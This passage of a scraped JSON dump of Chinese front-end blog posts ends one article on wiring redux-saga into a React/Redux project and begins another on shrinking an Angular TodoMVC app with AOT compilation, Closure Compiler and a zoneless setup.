class=\"heading\"\u003e初始化saga\u003c/h4\u003e\n\u003cp\u003eredux-saga是一个中间件，所以首先调用\u003ccode\u003ecreateSagaMiddleware\u003c/code\u003e方法创建中间件，然后使用redux的\u003ccode\u003eapplyMiddleware\u003c/code\u003e方法启用中间件，之后使用compose辅助方法传给\u003ccode\u003ecreateStore\u003c/code\u003e创建store，最后调用\u003ccode\u003erun\u003c/code\u003e方法启动根saga：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003eimport\u0026nbsp;{\u0026nbsp;createStore,\u0026nbsp;applyMiddleware,\u0026nbsp;compose\u0026nbsp;}\u0026nbsp;from\u0026nbsp;'redux';\u003cbr\u003eimport\u0026nbsp;createSagaMiddleware\u0026nbsp;from\u0026nbsp;'redux-saga';\u003cbr\u003eimport\u0026nbsp;rootSaga\u0026nbsp;from\u0026nbsp;'../sagas/'\u003cbr\u003e\u003cbr\u003econst\u0026nbsp;sagaMiddleware\u0026nbsp;=\u0026nbsp;createSagaMiddleware({\u0026nbsp;sagaMonitor\u0026nbsp;});\u003cbr\u003emiddleware.push(sagaMiddleware);\u003cbr\u003eenhancers.push(applyMiddleware(...middleware));\u003cbr\u003e\u003cbr\u003econst\u0026nbsp;store\u0026nbsp;=\u0026nbsp;createStore(rootReducer,\u0026nbsp;initialState,\u0026nbsp;compose(...enhancers));\u003cbr\u003e\u003cbr\u003e//\u0026nbsp;kick\u0026nbsp;off\u0026nbsp;root\u0026nbsp;saga\u003cbr\u003esagaMiddleware.run(rootSaga);\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003esaga分流\u003c/h4\u003e\n\u003cp\u003e在项目中通常会有很多并列模块，每个模块的saga流也应该是并列的，需要以多分支形式并列，redux-saga提供的\u003ccode\u003efork\u003c/code\u003e方法就是以新开分支的形式启动当前saga流：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003eimport\u0026nbsp;{\u0026nbsp;fork,\u0026nbsp;takeEvery\u0026nbsp;}\u0026nbsp;from\u0026nbsp;'redux-saga/effects'\u003cbr\u003eimport\u0026nbsp;{\u0026nbsp;HomeSaga\u0026nbsp;}\u0026nbsp;from\u0026nbsp;'./Home/flux.js'\u003cbr\u003eimport\u0026nbsp;{\u0026nbsp;AppSaga\u0026nbsp;}\u0026nbsp;from\u0026nbsp;'./Appflux.js'\u003cbr\u003e\u003cbr\u003econst\u0026nbsp;sagas\u0026nbsp;=\u0026nbsp;[\u003cbr\u003e\u0026nbsp;\u0026nbsp;...AppSaga,\u003cbr\u003e\u0026nbsp;\u0026nbsp;...HomeSaga\u003cbr\u003e]\u003cbr\u003e\u003cbr\u003eexport\u0026nbsp;default\u0026nbsp;function\u0026nbsp;*\u0026nbsp;root()\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;yield\u0026nbsp;sagas.map(saga\u0026nbsp;=\u0026gt;\u0026nbsp;fork(saga))\u003cbr\u003e}\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如上，首先收集所有模块根saga，然后遍历数组，启动每一个saga流根saga。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003esaga实例\u003c/h4\u003e\n\u003cp\u003e以AppSaga为例，我们期望在应用启动时就发起一些异步请求，如获取文章列表数据将其填充至redux store，而不等待使用数据的组件渲染完才开始请求数据，提高响应速度：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003econst\u0026nbsp;REQUEST_POST_LIST\u0026nbsp;=\u0026nbsp;'REQUEST_POST_LIST'\u003cbr\u003econst\u0026nbsp;RECEIVE_POST_LIST\u0026nbsp;=\u0026nbsp;'RECEIVE_POST_LIST'\u003cbr\u003e\u003cbr\u003e/**\u003cbr\u003e\u0026nbsp;*\u0026nbsp;请求文章列表ActionCreator\u003cbr\u003e\u0026nbsp;*\u0026nbsp;@param\u0026nbsp;{object}\u0026nbsp;payload\u003cbr\u003e\u0026nbsp;*/\u003cbr\u003efunction\u0026nbsp;requestPostList\u0026nbsp;(payload)\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;return\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;type:\u0026nbsp;REQUEST_POST_LIST,\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;payload:\u0026nbsp;payload\u003cbr\u003e\u0026nbsp;\u0026nbsp;}\u003cbr\u003e}\u003cbr\u003e\u003cbr\u003e/**\u003cbr\u003e\u0026nbsp;*\u0026nbsp;接收文章列表ActionCreator\u003cbr\u003e\u0026nbsp;*\u0026nbsp;@param\u0026nbsp;{*}\u0026nbsp;payload\u003cbr\u003e\u0026nbsp;*/\u003cbr\u003efunction\u0026nbsp;receivePostList\u0026nbsp;(payload)\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;return\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;type:\u0026nbsp;RECEIVE_POST_LIST,\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;payload:\u0026nbsp;payload\u003cbr\u003e\u0026nbsp;\u0026nbsp;}\u003cbr\u003e}\u003cbr\u003e\u003cbr\u003e/**\u003cbr\u003e\u0026nbsp;*\u0026nbsp;处理请求文章列表Saga\u003cbr\u003e\u0026nbsp;*\u0026nbsp;@param\u0026nbsp;{*}\u0026nbsp;payload\u0026nbsp;请求参数负载\u003cbr\u003e\u0026nbsp;*/\u003cbr\u003efunction\u0026nbsp;*\u0026nbsp;getPostListSaga\u0026nbsp;({\u0026nbsp;payload\u0026nbsp;})\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;const\u0026nbsp;data\u0026nbsp;=\u0026nbsp;yield\u0026nbsp;call(getPostList)\u003cbr\u003e\u0026nbsp;\u0026nbsp;yield\u0026nbsp;put(receivePostList(data))\u003cbr\u003e}\u003cbr\u003e\u003cbr\u003e//\u0026nbsp;定义AppSaga\u003cbr\u003eexport\u0026nbsp;function\u0026nbsp;*\u0026nbsp;AppSaga\u0026nbsp;(action)\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;//\u0026nbsp;接收最近一次请求，然后调用getPostListSaga子Saga\u003cbr\u003e\u0026nbsp;\u0026nbsp;yield\u0026nbsp;takeLatest(REQUEST_POST_LIST,\u0026nbsp;getPostListSaga)\u003cbr\u003e}\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003col\u003e\n\u003cli\u003e\u003ccode\u003etakeLatest\u003c/code\u003e：在\u003ccode\u003eAppSaga\u003c/code\u003e内使用\u003ccode\u003etakeLatest\u003c/code\u003e方法监听\u003ccode\u003eREQUEST_POST_LIST\u003c/code\u003eaction，若短时间内连续发起多次action，则会取消前面未响应的action，只发起最后一次action；\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003egetPostListSaga\u003c/code\u003e子Saga：当接收到该action时，调用\u003ccode\u003egetPostListSaga\u003c/code\u003e，并将payload传递给它，\u003ccode\u003egetPostListSaga\u003c/code\u003e是AppSaga的子级Saga，在里面处理具体异步任务；\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003egetPostList\u003c/code\u003e：\u003ccode\u003egetPostListSaga\u003c/code\u003e会调用\u003ccode\u003egetPostList\u003c/code\u003e方法，发起异步请求，拿到响应数据后，调用\u003ccode\u003ereceivePostList\u003c/code\u003e ActionCreator，创建并分发action，然后由reducer处理相应逻辑；\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003ccode\u003egetPostList\u003c/code\u003e方法内容如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003e/**\u003cbr\u003e\u0026nbsp;*\u0026nbsp;请求文章列表方法\u003cbr\u003e\u0026nbsp;*\u0026nbsp;@param\u0026nbsp;{*}\u0026nbsp;payload\u0026nbsp;请求参数\u003cbr\u003e\u0026nbsp;*\u0026nbsp;\u0026nbsp;eg:\u0026nbsp;{\u003cbr\u003e\u0026nbsp;*\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;page:\u0026nbsp;Num,\u003cbr\u003e\u0026nbsp;*\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;per_page:\u0026nbsp;Num\u003cbr\u003e\u0026nbsp;*\u0026nbsp;\u0026nbsp;}\u003cbr\u003e\u0026nbsp;*/\u003cbr\u003efunction\u0026nbsp;getPostList\u0026nbsp;(payload)\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;return\u0026nbsp;fetch({\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;...API.getPostList,\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;data:\u0026nbsp;payload\u003cbr\u003e\u0026nbsp;\u0026nbsp;}).then(res\u0026nbsp;=\u0026gt;\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;if\u0026nbsp;(res)\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;let\u0026nbsp;data\u0026nbsp;=\u0026nbsp;formatPostListData(res.data)\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;{\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;total:\u0026nbsp;parseInt(res.headers['X-WP-Total'.toLowerCase()],\u0026nbsp;10),\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;totalPages:\u0026nbsp;parseInt(res.headers['X-WP-TotalPages'.toLowerCase()],\u0026nbsp;10),\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;...data\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\u003cbr\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;}\u003cbr\u003e\u0026nbsp;\u0026nbsp;})\u003cbr\u003e}\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eput\u003c/code\u003e是redux-saga提供的可分发action方法，take，call等都是\u003ccode\u003eredux-saga\u003c/code\u003e提供的API，更多内容\u003ca target=\"_blank\" href=\"https://redux-saga.js.org/docs/api/\"\u003e查看API文档\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e之后便可以在项目路由根组件注入ActionCreator，创建action，然后saga就会接收进行处理了。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003esaga与Reactotron\u003c/h3\u003e\n\u003cp\u003e前面已经配置好可以使用Reactotron捕获应用所有redux和action，而redux-saga是一类redux中间件，所以捕获sagas需要额外配置，创建store时，在saga中间件内添加sagaMonitor服务，监听saga:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs react\" lang=\"react\"\u003econst\u0026nbsp;sagaMonitor\u0026nbsp;=\u0026nbsp;Config.useReactotron\u0026nbsp;?\u0026nbsp;console.tron.createSagaMonitor()\u0026nbsp;:\u0026nbsp;null;\u003cbr\u003econst\u0026nbsp;sagaMiddleware\u0026nbsp;=\u0026nbsp;createSagaMiddleware({\u0026nbsp;sagaMonitor\u0026nbsp;});\u003cbr\u003emiddleware.push(sagaMiddleware);\u003cbr\u003e...\u003cbr\u003e\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e总结\u003c/h2\u003e\n\u003cp\u003e本文较详细的总结了个人从0到1搭建一个项目架构的过程，对React， Redux应用和项目工程实践都有了更深的理解及思考，在大前端成长之路继续砥砺前行。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e注：文中列出的所有技术栈，博主计划一步一步推进，目前源码中使用的技术有React，React Router，Redux，react-redux，react-router-redux，Redux-saga，axios。后期计划推进Immutable，Reactotron，Redux Persist。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/codingplayboy/react-blog\"\u003e完整项目代码见github\u003c/a\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e参考\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://reactjs.org/docs/integrating-with-other-libraries.html\"\u003eReact\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://redux.js.org/\"\u003eRedux\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://reacttraining.com/react-router/web/guides/philosophy\"\u003eReact Router v4\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://redux-saga.js.org/\"\u003eredux-saga\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca target=\"_blank\" href=\"https://github.com/rt2zz/redux-persist\"\u003eRedux Persist\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n","buildTime":"1514891569.0711","__v":0}
{"_id":{"$oid":"5a4b770f19da8721f49c0704"},"id":"5a37765ff265da430f323271","author":{"$oid":"5a4b770f19da8721f49c06f2"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"Angular 应用瘦身记——比 jQuery 更小的 TodoMVC","meta":{"likeCount":0},"tag":["Angular.js","jQuery"],"comment":[],"shortContent":"本文内容提取自 《2017成都WEB前端交流大会》 中的主题演讲。 众所周知，Angular 以官方提供的一体化解决方案（全家桶）而闻名，官方团队提供了构建 Web App 所需的大部分类库和工具支持。 不过，「大而全」的「大」指的是覆盖范围广，而并非应用体积大，这里我们以 T…","content":"\u003cp\u003e本文内容提取自 \u003ca target=\"_blank\" href=\"https://web-conf.tk/\"\u003e《2017成都WEB前端交流大会》\u003c/a\u003e 中的主题演讲。\u003c/p\u003e\n\u003cp\u003e众所周知，Angular 以官方提供的一体化解决方案（全家桶）而闻名，官方团队提供了构建 Web App 所需的大部分类库和工具支持。\u003c/p\u003e\n\u003cp\u003e不过，「大而全」的「大」指的是覆盖范围广，而并非应用体积大，这里我们以 \u003ca target=\"_blank\" href=\"https://trotyl.github.io/ng-slim-demo/\"\u003eTodoMVC\u003c/a\u003e 为例，将其优化到比 jQuery 更小的体积\u003csup\u003e1\u003c/sup\u003e。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"应用加载大小示例\" src=\"https://user-gold-cdn.xitu.io/2017/12/18/1606a07e7fd24837?w=610\u0026amp;h=467\u0026amp;f=png\u0026amp;s=73833\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003csub\u003e\u003cem\u003e1. 本文写作时 jQuery 的最新版本为 3.2.1，非 slim 版本 min+gzip 后大小为 33,861B。为 Chrome 中的实际传输大小，可能与本地压缩结果略有差异。\u003c/em\u003e\u003c/sub\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eAOT 编译\u003c/h2\u003e\n\u003cp\u003eAngular 模版采用了编译到 JavaScript 结构化数据的方式\u003csup\u003e2\u003c/sup\u003e，虽然组件模版使用 \u003ccode\u003e.html\u003c/code\u003e 文件\u003csup\u003e3\u003c/sup\u003e定义，但浏览器并不能见到这个 HTML 文件，而只能见到编译后的 JavaScript 文件。\u003c/p\u003e\n\u003cp\u003e例如，一个简单的表单控件：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"form-group\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elabel\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003efor\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"exampleInput\"\u003c/span\u003e\u0026gt;\u003c/span\u003eEmail address\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003elabel\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003einput\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"email\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"form-control\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"exampleInput\"\u003c/span\u003e [\u003cspan class=\"hljs-attr\"\u003evalue\u003c/span\u003e]=\u003cspan class=\"hljs-string\"\u003e\"email\"\u003c/span\u003e (\u003cspan class=\"hljs-attr\"\u003echange\u003c/span\u003e)=\u003cspan class=\"hljs-string\"\u003e\"onEmailChange($event)\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003esmall\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"emailHelp\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"form-text text-muted\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    We'll never share your email with anyone else.\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003esmall\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e将会被编译为\u003csup\u003e4\u003c/sup\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eexport\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eView_AppComponent\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{ \n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e viewDef(\n    ViewFlags.None, [\n      elementDef(\u003cspan class=\"hljs-string\"\u003e'div'\u003c/span\u003e, [[\u003cspan class=\"hljs-string\"\u003e'class'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'form-group'\u003c/span\u003e]]),\n      elementDef(\u003cspan class=\"hljs-string\"\u003e'label'\u003c/span\u003e, [[\u003cspan class=\"hljs-string\"\u003e'for'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'exampleInput'\u003c/span\u003e]]),\n      textDef([\u003cspan class=\"hljs-string\"\u003e'Email address'\u003c/span\u003e]),\n      elementDef(\u003cspan class=\"hljs-string\"\u003e'input'\u003c/span\u003e, \n        [[\u003cspan class=\"hljs-string\"\u003e'class'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'form-control'\u003c/span\u003e], [\u003cspan class=\"hljs-string\"\u003e'id'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'exampleInput'\u003c/span\u003e], [\u003cspan class=\"hljs-string\"\u003e'type'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'email'\u003c/span\u003e]],\n        [[BindingFlags.TypeProperty, \u003cspan class=\"hljs-string\"\u003e'value'\u003c/span\u003e]],\n        [[\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'change'\u003c/span\u003e]],\n        (viewData, eventName, $event) =\u0026gt; {\n          \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ((eventName === \u003cspan class=\"hljs-string\"\u003e'change'\u003c/span\u003e)) {\n            viewData.component.onEmailChange($event)\n          }\n        }\n      ),\n      elementDef(\u003cspan class=\"hljs-string\"\u003e'small'\u003c/span\u003e, [[\u003cspan class=\"hljs-string\"\u003e'class'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'form-text text-muted'\u003c/span\u003e], [\u003cspan class=\"hljs-string\"\u003e'id'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'emailHelp'\u003c/span\u003e]]),\n      textDef([\u003cspan class=\"hljs-string\"\u003e`We'll never share your email with anyone else.`\u003c/span\u003e]),\n    ],\n    (check, viewData) =\u0026gt; {\n      \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e currVal = viewData.component.email\n      check(viewData, currVal)\n    }\n  )\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e对于 Angular 而言，如果这个编译过程发生在应用启动之前，就叫做 AOT 编译；反之若是在应用启动之后，则为 JIT 编译。\u003c/p\u003e\n\u003cp\u003e由于 AOT 编译过程，我们的发布内容仅有 JavaScript，而不包含任何 HTML，有利于进一步的优化。\u003c/p\u003e\n\u003cp\u003e\u003csub\u003e\u003cem\u003e2. 仅适用于当前的 4.x 和 5.x 版本，2.x 版本中模版编译为完整的视图操作语句，6.x 版本中模版将编译为逻辑化的模版函数（甚至可以手写）。\u003c/em\u003e\u003c/sub\u003e\u003c/p\u003e\n\u003cp\u003e\u003csub\u003e\u003cem\u003e3. 也可能位于内联在逻辑代码中的字符串里。\u003c/em\u003e\u003c/sub\u003e\u003c/p\u003e\n\u003cp\u003e\u003csub\u003e\u003cem\u003e4. 为了可读性略有简化。\u003c/em\u003e\u003c/sub\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eClosure Compiler\u003c/h2\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://developers.google.com/closure/compiler/\"\u003eClosure Compiler\u003c/a\u003e 是 Google 推出的一款 JavaScript 优化编译器，用于优化应用体积和执行性能。被视为 Angular 的下一代构建工具\u003csup\u003e5\u003c/sup\u003e之一。\u003c/p\u003e\n\u003cp\u003e在 \u003ccode\u003eADVANCED\u003c/code\u003e 模式下，Closure Compiler 会进行最大程度的内联，例如以下代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e items = [\n  { \u003cspan class=\"hljs-attr\"\u003eval\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e },\n  { \u003cspan class=\"hljs-attr\"\u003eval\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e },\n  { \u003cspan class=\"hljs-attr\"\u003eval\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e },\n  { \u003cspan class=\"hljs-attr\"\u003eval\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e },\n  { \u003cspan class=\"hljs-attr\"\u003eval\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e },\n]\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e item = items[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e]\n\n\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(item.val)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e会被优化为：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可以参考这里的\u003ca target=\"_blank\" href=\"https://closure-compiler.appspot.com/home#code%3D%252F%252F%2520%253D%253DClosureCompiler%253D%253D%250A%252F%252F%2520%2540compilation_level%2520ADVANCED_OPTIMIZATIONS%250A%252F%252F%2520%2540output_file_name%2520default.js%250A%252F%252F%2520%253D%253D%252FClosureCompiler%253D%253D%250A%250Aconst%2520items%2520%253D%2520%255B%250A%2520%2520%257B%2520val%253A%25201%2520%257D%252C%250A%2520%2520%257B%2520val%253A%25202%2520%257D%252C%250A%2520%2520%257B%2520val%253A%25203%2520%257D%252C%250A%2520%2520%257B%2520val%253A%25204%2520%257D%252C%250A%2520%2520%257B%2520val%253A%25205%2520%257D%252C%250A%255D%250A%250Aconst%2520item%2520%253D%2520items%255B2%255D%250A%250Aconsole.log(item.val)%250A\"\u003e在线示例\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003eAngular 自身的代码（及编译器生成的代码）提供了对 Closure Compiler 的 \u003ccode\u003eADVANCED\u003c/code\u003e 模式的兼容性保证，因此可以利用 Closure Compiler 来大程度优化编译体积。\u003c/p\u003e\n\u003cp\u003e\u003csub\u003e\u003cem\u003e5. \u003ca target=\"_blank\" href=\"https://medium.com/@Jakeherringbone/what-angular-is-doing-with-bazel-and-closure-21f526f64a34\"\u003eWhat Angular is doing with Bazel and Closure\u003c/a\u003e\u003c/em\u003e。\u003c/sub\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e去除 Zone.js\u003c/h2\u003e\n\u003cp\u003e曾经的 AngularJS 中，为了保证框架能够知晓用户的异步操作，所有操作都需要使用 \u003ccode\u003e$scope.$apply\u003c/code\u003e 进行包装，例如通过 \u003ccode\u003e$timeout\u003c/code\u003e、\u003ccode\u003e$interval\u003c/code\u003e 执行延时任务，从而能够触发 AngularJS 的变化检测。\u003c/p\u003e\n\u003cp\u003e而 Angular 为了改变这一现状，引入了 Zone.js 来解决这一问题，通过拦截所有可能的异步任务触发过程，从而能够知晓所有异步回调的发生。因此，在 Angular 中可以无需任何额外配置的情况下使用纯命令式的操作来修改 ViewModel。\u003c/p\u003e\n\u003cp\u003e在 Angular v4 及之前的版本中，我们需要提供一个什么都不做的 Zone 对象来规避 Angular 的依赖检查。不过从 v5 开始，Angular 自身提供了不使用 Zone.js 的支持\u003csup\u003e6\u003c/sup\u003e，仅仅需要在启动代码中配置 \u003ccode\u003e{ ngZone: 'noop' }\u003c/code\u003e ，因此并不需要太担心兼容性部分，仅仅考虑业务上的实现即可。\u003c/p\u003e\n\u003cp\u003e所以，为了不用 Zone.js，我们只需要：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e不使用自动触发的变化检测；\u003c/li\u003e\n\u003cli\u003e不使用命令式的操作。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e对于 1)，我们可以使用 \u003ca target=\"_blank\" href=\"https://angular.io/api/core/ChangeDetectorRef\"\u003e\u003ccode\u003eChangeDetectorRef\u003c/code\u003e\u003c/a\u003e API 来手动触发变化检测。但对于大型应用而言，难免会增加应用的复杂度。\u003c/p\u003e\n\u003cp\u003e所以更可行的方式是 2)，可以像某些其它框架一样，放弃命令式的状态修改，全部使用方法调用的方式来修改数据。虽然事实上仍然是手动触发 trigger，但只要美名其曰响应式，一切就会顺其自然。例如在 \u003ca target=\"_blank\" href=\"https://stackblitz.com/edit/angular-no-zones-setstate?embed=1\u0026amp;file=app/app.component.ts\"\u003eAngular No-Zone setState Demo\u003c/a\u003e 中，简单地实现了一个具备批处理能力的 setState\u003csup\u003e7\u003c/sup\u003e 方法，可以在不使用 Zone.js 的情况下较为自然地实现变化检测。\u003c/p\u003e\n\u003cp\u003e另一个更适用于 Angular 的实现方式是利用 Observable，由于 Angular 本身具备对 RxJS 的良好集成，引入 Observable 并不需要任何额外的成本。而 Observable 基于事件流的方式工作，只要把内容更新托管给 Pipe，那么也可以完全规避命令式操作。例如在 \u003ca target=\"_blank\" href=\"https://stackblitz.com/edit/angular-no-zones?embed=1\u0026amp;file=app/app.component.ts\"\u003eAngular No-Zone Observable Demo\u003c/a\u003e 中就有使用自定义 Pipe 来自动应用 Observable 状态更新的例子。\u003c/p\u003e\n\u003cp\u003e\u003csub\u003e\u003cem\u003e6. \u003ca target=\"_blank\" href=\"https://zhuanlan.zhihu.com/p/29577461\"\u003e【SNF-A】Angular 增加不使用 Zone.js 的支持\u003c/a\u003e。\u003c/em\u003e\u003c/sub\u003e\u003c/p\u003e\n\u003cp\u003e\u003csub\u003e\u003cem\u003e7. 事实上 Dart 版本的 Angular 原生提供了 setState 方法：\u003ca target=\"_blank\" href=\"https://github.com/dart-lang/angular/blob/51cf8625ad35d09f349dc9cac40cd983bd1274d4/angular/lib/src/core/change_detection/component_state.dart#L17-L20\"\u003eangular/component_state.dart at 51cf8625ad35d09f349dc9cac40cd983bd1274d4 · dart-lang/angular\u003c/a\u003e，这里仅针对 JavaScript 版本。\u003c/em\u003e\u003c/sub\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e去除 BrowserModule\u003c/h2\u003e\n\u003cp\u003eAngular 自身是一个平台无关的数据绑定框架，为此如果需要让 Angular 在浏览器中运行，需要引入浏览器平台相关的部分，即 